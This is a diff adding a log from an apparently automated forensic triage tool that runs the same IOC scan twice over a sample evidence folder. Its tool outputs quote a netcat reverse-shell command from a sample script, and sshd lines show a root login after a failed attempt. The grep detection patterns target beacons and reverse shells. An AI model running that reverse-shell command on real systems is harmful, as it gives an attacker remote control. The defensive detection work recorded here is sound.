@@ -1,0 +1,104 @@
+[2026-05-27T21:01:21.895014] [INFO] [NEXUS-IR] ============================================================
+[2026-05-27T21:01:21.895524] [INFO] [NEXUS-IR] NEXUS-IR AUTONOMOUS INVESTIGATION STARTING
+[2026-05-27T21:01:21.895644] [INFO] [NEXUS-IR] ============================================================
+[2026-05-27T21:01:21.895804] [INFO] [NEXUS-IR] --- AUTONOMOUS PHASE 1: Initial Reconnaissance ---
+[2026-05-27T21:01:21.895908] [INFO] [NEXUS-IR] TOOL_CALL: filesystem_recon
+[2026-05-27T21:01:21.896024] [INFO] [NEXUS-IR] TOOL_INPUT: find ~/findevil/evidence -type f 2>/dev/null && ls -la ~/findevil/evidence/sampl
+[2026-05-27T21:01:21.905046] [INFO] [NEXUS-IR] TOOL_OUTPUT: /home/macbere/findevil/evidence/terry.dd.bz2
+/home/macbere/findevil/evidence/test_evidence.dd
+/home/macbere/findevil/evidence/sample/suspicious.sh
+/home/macbere/findevil/evidence/sample/cleared_logs.t
+[2026-05-27T21:01:21.905174] [INFO] [NEXUS-IR] SELF_CORRECTION_START: context=recon attempt=1
+[2026-05-27T21:01:21.905281] [WARN] [NEXUS-IR] CORRECTION_TRIGGER: No IOC patterns found
+[2026-05-27T21:01:21.905374] [WARN] [NEXUS-IR] CORRECTION_DECISION: Switching to broader pattern match
+[2026-05-27T21:01:21.905473] [INFO] [NEXUS-IR] TOOL_CALL: recon_retry
+[2026-05-27T21:01:21.905580] [INFO] [NEXUS-IR] TOOL_INPUT: find ~/findevil -name '*.sh' -o -name '*.txt' -o -name '*.dd' 2>/dev/null
+[2026-05-27T21:01:21.915531] [INFO] [NEXUS-IR] TOOL_OUTPUT: /home/macbere/findevil/reports/bottleneck_ranking.txt
+/home/macbere/findevil/reports/carved_Tue_May_26_20_15_52_2026/audit.txt
+/home/macbere/findevil/evidence/test_evidence.dd
+/home/macbere/findevil/e
+[2026-05-27T21:01:21.915721] [INFO] [NEXUS-IR] SELF_CORRECTION_START: context=recon_retry attempt=2
+[2026-05-27T21:01:21.915851] [WARN] [NEXUS-IR] CORRECTION_TRIGGER: No IOC patterns found
+[2026-05-27T21:01:21.915942] [WARN] [NEXUS-IR] CORRECTION_DECISION: Switching to broader pattern match
+[2026-05-27T21:01:21.916040] [INFO] [NEXUS-IR] --- AUTONOMOUS REASONING: What should I investigate? ---
+[2026-05-27T21:01:21.916135] [INFO] [NEXUS-IR] REASONING: Analyzing findings to determine next investigation step
+[2026-05-27T21:01:21.916245] [INFO] [NEXUS-IR] REASONING_DECISION: BROAD_SCAN
+[2026-05-27T21:01:21.916333] [INFO] [NEXUS-IR] REASONING_JUSTIFICATION: No clear pattern — running full evidence scan
+[2026-05-27T21:01:21.916503] [INFO] [NEXUS-IR] --- AUTONOMOUS PHASE 3: Executing BROAD_SCAN ---
+[2026-05-27T21:01:21.916621] [INFO] [NEXUS-IR] TOOL_CALL: broad_scan
+[2026-05-27T21:01:21.916723] [INFO] [NEXUS-IR] TOOL_INPUT: grep -r '192.168\|beacon\|reverse' ~/findevil/evidence/sample/ 2>/dev/null
+[2026-05-27T21:01:21.921621] [INFO] [NEXUS-IR] TOOL_OUTPUT: /home/macbere/findevil/evidence/sample/suspicious.sh:nc -e /bin/bash 192.168.1.100 4444
+/home/macbere/findevil/evidence/sample/ioc_list.txt:IP: 192.168.1.100
+[2026-05-27T21:01:21.921749] [INFO] [NEXUS-IR] SELF_CORRECTION_START: context=BROAD_SCAN attempt=1
+[2026-05-27T21:01:21.921889] [INFO] [NEXUS-IR] VALIDATION_PASS: 3 IOCs confirmed: ['192.168', 'nc ', 'bash']
+[2026-05-27T21:01:21.922030] [INFO] [NEXUS-IR] --- AUTONOMOUS REASONING: Pivot based on new evidence ---
+[2026-05-27T21:01:21.922190] [INFO] [NEXUS-IR] REASONING: Analyzing findings to determine next investigation step
+[2026-05-27T21:01:21.924786] [INFO] [NEXUS-IR] REASONING_DECISION: AUTH_LOG_PRIORITY
+[2026-05-27T21:01:21.926359] [INFO] [NEXUS-IR] REASONING_JUSTIFICATION: Network IOC found — pivoting to auth logs to find attacker entry
+[2026-05-27T21:01:21.926487] [INFO] [NEXUS-IR] PIVOT_DECISION: AUTH_LOG_PRIORITY — Network IOC found — pivoting to auth logs to find attacker entry
+[2026-05-27T21:01:21.926546] [INFO] [NEXUS-IR] --- AUTONOMOUS PHASE 5: IOC Correlation & Validation ---
+[2026-05-27T21:01:21.926611] [INFO] [NEXUS-IR] TOOL_CALL: ioc_correlator
+[2026-05-27T21:01:21.926656] [INFO] [NEXUS-IR] TOOL_INPUT: grep -h '192.168.1.100\|10.0.0.5\|4444\|bash\|nc ' ~/findevil/evidence/sample/*.
+[2026-05-27T21:01:21.940888] [INFO] [NEXUS-IR] TOOL_OUTPUT: #!/bin/bash
+IP: 192.168.1.100
+May 26 03:14 sshd: Failed password for root from 10.0.0.5
+May 26 03:15 sshd: Accepted password for root from 10.0.0.5
+nc -e /bin/bash 192.168.1.100 4444
+[2026-05-27T21:01:21.941106] [INFO] [NEXUS-IR] SELF_CORRECTION_START: context=ioc_correlation attempt=1
+[2026-05-27T21:01:21.941274] [INFO] [NEXUS-IR] VALIDATION_PASS: 6 IOCs confirmed: ['192.168', '10.0.0', 'nc ', 'bash', 'Failed', 'Accepted']
+[2026-05-27T21:01:21.942218] [INFO] [NEXUS-IR] ============================================================
+[2026-05-27T21:01:21.942490] [INFO] [NEXUS-IR] NEXUS-IR COMPLETE: 2 findings, 1 corrections, 2 reasoning pivots
+[2026-05-27T21:01:21.943644] [INFO] [NEXUS-IR] Report: /home/macbere/findevil/reports/nexus_findings.json
+[2026-05-27T21:01:21.944362] [INFO] [NEXUS-IR] ============================================================
+[2026-05-27T21:04:47.676014] [INFO] [NEXUS-IR] ============================================================
+[2026-05-27T21:04:47.676193] [INFO] [NEXUS-IR] NEXUS-IR AUTONOMOUS INVESTIGATION STARTING
+[2026-05-27T21:04:47.676326] [INFO] [NEXUS-IR] ============================================================
+[2026-05-27T21:04:47.676459] [INFO] [NEXUS-IR] --- AUTONOMOUS PHASE 1: Initial Reconnaissance ---
+[2026-05-27T21:04:47.676592] [INFO] [NEXUS-IR] TOOL_CALL: filesystem_recon
+[2026-05-27T21:04:47.676737] [INFO] [NEXUS-IR] TOOL_INPUT: find ~/findevil/evidence -type f 2>/dev/null && ls -la ~/findevil/evidence/sampl
+[2026-05-27T21:04:47.685605] [INFO] [NEXUS-IR] TOOL_OUTPUT: /home/macbere/findevil/evidence/terry.dd.bz2
+/home/macbere/findevil/evidence/test_evidence.dd
+/home/macbere/findevil/evidence/sample/suspicious.sh
+/home/macbere/findevil/evidence/sample/cleared_logs.t
+[2026-05-27T21:04:47.685771] [INFO] [NEXUS-IR] SELF_CORRECTION_START: context=recon attempt=1
+[2026-05-27T21:04:47.685956] [WARN] [NEXUS-IR] CORRECTION_TRIGGER: No IOC patterns found
+[2026-05-27T21:04:47.686128] [WARN] [NEXUS-IR] CORRECTION_DECISION: Switching to broader pattern match
+[2026-05-27T21:04:47.686398] [INFO] [NEXUS-IR] TOOL_CALL: recon_retry
+[2026-05-27T21:04:47.686593] [INFO] [NEXUS-IR] TOOL_INPUT: find ~/findevil -name '*.sh' -o -name '*.txt' -o -name '*.dd' 2>/dev/null
+[2026-05-27T21:04:47.693371] [INFO] [NEXUS-IR] TOOL_OUTPUT: /home/macbere/findevil/setup.sh
+/home/macbere/findevil/reports/bottleneck_ranking.txt
+/home/macbere/findevil/reports/carved_Tue_May_26_20_15_52_2026/audit.txt
+/home/macbere/findevil/evidence/test_evid
+[2026-05-27T21:04:47.693525] [INFO] [NEXUS-IR] SELF_CORRECTION_START: context=recon_retry attempt=2
+[2026-05-27T21:04:47.693678] [WARN] [NEXUS-IR] CORRECTION_TRIGGER: No IOC patterns found
+[2026-05-27T21:04:47.693797] [WARN] [NEXUS-IR] CORRECTION_DECISION: Switching to broader pattern match
+[2026-05-27T21:04:47.693939] [INFO] [NEXUS-IR] --- AUTONOMOUS REASONING: What should I investigate? ---
+[2026-05-27T21:04:47.694065] [INFO] [NEXUS-IR] REASONING: Analyzing findings to determine next investigation step
+[2026-05-27T21:04:47.694200] [INFO] [NEXUS-IR] REASONING_DECISION: BROAD_SCAN
+[2026-05-27T21:04:47.694324] [INFO] [NEXUS-IR] REASONING_JUSTIFICATION: No clear pattern — running full evidence scan
+[2026-05-27T21:04:47.694441] [INFO] [NEXUS-IR] --- AUTONOMOUS PHASE 3: Executing BROAD_SCAN ---
+[2026-05-27T21:04:47.694559] [INFO] [NEXUS-IR] TOOL_CALL: broad_scan
+[2026-05-27T21:04:47.694682] [INFO] [NEXUS-IR] TOOL_INPUT: grep -r '192.168\|beacon\|reverse' ~/findevil/evidence/sample/ 2>/dev/null
+[2026-05-27T21:04:47.701108] [INFO] [NEXUS-IR] TOOL_OUTPUT: /home/macbere/findevil/evidence/sample/suspicious.sh:nc -e /bin/bash 192.168.1.100 4444
+/home/macbere/findevil/evidence/sample/ioc_list.txt:IP: 192.168.1.100
+[2026-05-27T21:04:47.701309] [INFO] [NEXUS-IR] SELF_CORRECTION_START: context=BROAD_SCAN attempt=1
+[2026-05-27T21:04:47.701473] [INFO] [NEXUS-IR] VALIDATION_PASS: 3 IOCs confirmed: ['192.168', 'nc ', 'bash']
+[2026-05-27T21:04:47.701628] [INFO] [NEXUS-IR] --- AUTONOMOUS REASONING: Pivot based on new evidence ---
+[2026-05-27T21:04:47.701769] [INFO] [NEXUS-IR] REASONING: Analyzing findings to determine next investigation step
+[2026-05-27T21:04:47.701943] [INFO] [NEXUS-IR] REASONING_DECISION: AUTH_LOG_PRIORITY
+[2026-05-27T21:04:47.702171] [INFO] [NEXUS-IR] REASONING_JUSTIFICATION: Network IOC found — pivoting to auth logs to find attacker entry
+[2026-05-27T21:04:47.702519] [INFO] [NEXUS-IR] PIVOT_DECISION: AUTH_LOG_PRIORITY — Network IOC found — pivoting to auth logs to find attacker entry
+[2026-05-27T21:04:47.702656] [INFO] [NEXUS-IR] --- AUTONOMOUS PHASE 5: IOC Correlation & Validation ---
+[2026-05-27T21:04:47.702780] [INFO] [NEXUS-IR] TOOL_CALL: ioc_correlator
+[2026-05-27T21:04:47.702899] [INFO] [NEXUS-IR] TOOL_INPUT: grep -h '192.168.1.100\|10.0.0.5\|4444\|bash\|nc ' ~/findevil/evidence/sample/*.
+[2026-05-27T21:04:47.708441] [INFO] [NEXUS-IR] TOOL_OUTPUT: #!/bin/bash
+IP: 192.168.1.100
+May 26 03:14 sshd: Failed password for root from 10.0.0.5
+May 26 03:15 sshd: Accepted password for root from 10.0.0.5
+nc -e /bin/bash 192.168.1.100 4444
+[2026-05-27T21:04:47.708608] [INFO] [NEXUS-IR] SELF_CORRECTION_START: context=ioc_correlation attempt=1
+[2026-05-27T21:04:47.708726] [INFO] [NEXUS-IR] VALIDATION_PASS: 6 IOCs confirmed: ['192.168', '10.0.0', 'nc ', 'bash', 'Failed', 'Accepted']
+[2026-05-27T21:04:47.709266] [INFO] [NEXUS-IR] ============================================================
+[2026-05-27T21:04:47.709572] [INFO] [NEXUS-IR] NEXUS-IR COMPLETE: 2 findings, 1 corrections, 2 reasoning pivots
+[2026-05-27T21:04:47.709834] [INFO] [NEXUS-IR] Report: /home/macbere/findevil/reports/nexus_findings.json
+[2026-05-27T21:04:47.710086] [INFO] [NEXUS-IR] ============================================================
